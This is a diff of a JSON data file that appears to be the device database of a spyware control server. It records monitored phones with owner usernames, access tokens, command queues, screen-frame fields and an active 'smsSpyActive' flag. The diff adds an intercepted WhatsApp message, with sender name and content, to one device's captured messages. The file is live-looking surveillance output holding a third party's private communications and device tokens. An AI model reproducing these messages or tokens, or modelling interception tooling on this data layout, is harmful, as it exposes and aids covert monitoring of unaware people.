@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777199505155,
+    "lastSeen": 1777199529112,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -4053,6 +4053,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Asyra✨",
+        "content": "Iya tapi siapa aja",
+        "time": "26/04 18:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777199506016
+      },
       {
         "appName": "WhatsApp",
         "sender": "Asyra✨",
@@ -8065,7 +8073,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777199504112,
+    "lastSeen": 1777199530979,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
